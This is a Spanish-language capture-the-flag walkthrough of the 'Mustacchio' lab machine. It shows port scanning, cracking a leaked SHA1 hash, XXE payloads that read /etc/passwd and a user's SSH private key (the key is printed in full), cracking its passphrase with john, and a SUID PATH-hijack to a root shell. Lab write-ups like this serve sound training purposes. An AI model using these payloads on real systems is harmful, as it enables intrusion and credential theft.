# Mustacchio

## Scanning

```shell
nmap -sS -p- --min-rate 5000 -vvv --open -Pn -n -oG allports 10.10.0.151
nmap -sC -sV -p 22,80 -Pn -n -oN targeted 10.10.0.151
```

![0814160418.png](0814160418.png)

## 80

Para la página usamos wfuzz para buscar carpetas en la página. Encontramos que existe la carpeta custom y dentro la carpeta js donde podemos ver el archivo `users.bak`.

![0814160416.png](0814160416.png)

Usamos el comando file para saber que tipo de archivo es.

![0814170529.png](0814170529.png)

Usaremos la herramienta que tenemos en parrot llamada sqlitebrowser para importar el archivo que debemos cambiar el nombre a '**users.sqlite**' aquí encontraremos un usuario y una contraseña o podría ser un hash.

![0814170503.png](0814170503.png)

Descubrimos que es algún tipo de sha1 así que usaremos john para crackear la contraseña.
![0814170546.png](0814170546.png)

## 8765

En https://IP:8765 encontramos un panel de administración donde podemos probar las credenciales que encontramos anteriormente.

![0816180630.png](0816180630.png)

En el código fuente encontramos un enlace como comentario. También había un comentario indicando que se podía entrar por ssh, esto lo tomaremos en cuenta más adelante.

![0816180626.png](0816180626.png)

Lo descargamos y encontramos que es un archivo xml.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>
```
Este es un ejemplo de como enviar el comentario que te dan en el sitio web. Usaremos el siguiente código para probar el xxe.

## XXE
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM  "file:///etc/passwd" >]>
<comment>
  <name>&xxe;</name>
  <author>miaumilliano</author>
  <com>meow</com>
</comment>
```

Como nos dieron la pista de que se puede ingresar con ssh entonces buscaremos si tiene algún id_rsa para conectarse con los usuarios que encontramos con la anterior consulta(`joe` y `barry`).

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM  "file:///home/barry/.ssh/id_rsa" >]>
<comment>
  <name>&xxe;</name>
  <author>miaumilliano</author>
  <com>meow</com>
</comment>
```

Con barry encontramos resultados.

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E

jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN
bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU
MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65
l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1/alUUvI/jM8bOS2D
Wfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7E
NsNswVykkr3gswl2BMTqGz1bw/1gOdCj3Byc1LJ6mRWXfD3HSmWcc/8bHfdvVSgQ
ul7A8ROlzvri7/WHlcIA1SfcrFaUj8vfXi53fip9gBbLf6syOo0zDJ4Vvw3ycOie
TH6b6mGFexRiSaE/u3r54vZzL0KHgXtapzb4gDl/yQJo3wqD1FfY7AC12eUc9NdC
rcvG8XcDg+oBQokDnGVSnGmmvmPxIsVTT3027ykzwei3WVlagMBCOO/ekoYeNWlX
bhl1qTtQ6uC1kHjyTHUKNZVB78eDSankoERLyfcda49k/exHZYTmmKKcdjNQ+KNk
4cpvlG9Qp5Fh7uFCDWohE/qELpRKZ4/k6HiA4FS13D59JlvLCKQ6IwOfIRnstYB8
7+YoMkPWHvKjmS/vMX+elcZcvh47KNdNl4kQx65BSTmrUSK8GgGnqIJu2/G1fBk+
T+gWceS51WrxIJuimmjwuFD3S2XZaVXJSdK7ivD3E8KfWjgMx0zXFu4McnCfAWki
ahYmead6WiWHtM98G/hQ6K6yPDO7GDh7BZuMgpND/LbS+vpBPRzXotClXH6Q99I7
LIuQCN5hCb8ZHFD06A+F2aZNpg0G7FsyTwTnACtZLZ61GdxhNi+3tjOVDGQkPVUs
pkh9gqv5+mdZ6LVEqQ31eW2zdtCUfUu4WSzr+AndHPa2lqt90P+wH2iSd4bMSsxg
laXPXdcVJxmwTs+Kl56fRomKD9YdPtD4Uvyr53Ch7CiiJNsFJg4lY2s7WiAlxx9o
vpJLGMtpzhg8AXJFVAtwaRAFPxn54y1FITXX6tivk62yDRjPsXfzwbMNsvGFgvQK
DZkaeK+bBjXrmuqD4EB9K540RuO6d7kiwKNnTVgTspWlVCebMfLIi76SKtxLVpnF
6aak2iJkMIQ9I0bukDOLXMOAoEamlKJT5g+wZCC5aUI6cZG0Mv0XKbSX2DTmhyUF
ckQU/dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs
7bdofhlZBjXYdIlZgBAqdq5jBJU8GtFcGyph9cb3f+C3nkmeDZJGRJwxUYeUS9Of
1dVkfWUhH2x9apWRV8pJM/ByDd0kNWa/c//MrGM0+DKkHoAZKfDl3sC0gdRB7kUQ
+Z87nFImxw95dxVvoZXZvoMSb7Ovf27AUhUeeU8ctWselKRmPw56+xhObBoAbRIn
7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD
-----END RSA PRIVATE KEY-----
```

Vemos que esta encriptado pero podemos usar ssh2john para encontrar la contraseña necesaria para usar esta id_rsa.

```shell
python2 /usr/share/john/ssh2john.py id_rsa > id_rsa.john

john id_rsa.john --wordlist=/usr/share/wordlists/rockyou.txt
```

![0816180616](0816180616.png)

Ahora que encontramos la clave podemos ingresar al usuario barry.

```shell
ssh barry@10.10.211.98 -i id_rsa
```

![0816190721](0816190721.png)

## Privilege scalation

### SUID

```shell
find / -perm -u=s -type f 2>/dev/null
```

![0816190711](0816190711.png)

**/home/joe/livelog** parece ser un archivo sospechoso.
Al ejecutarlo podemos ver que lee los logs de la aplicación web.

Con la función ltrace vemos de que hace uso del comando tail
pero no usa una ruta absoluta por lo que podriamos cambiar el path para que busque primero en los archivos temporales un comando tail modificado que pueda ejecutar una terminal con los permisos que el SUID nos permita.

![0816190701](0816190701.png)

```shell
cd /tmp
echo "/bin/bash" > tail
chmod +x tail

export PATH=/tmp:$PATH
/home/joe/live_log
```

![0816190759](0816190759.png)
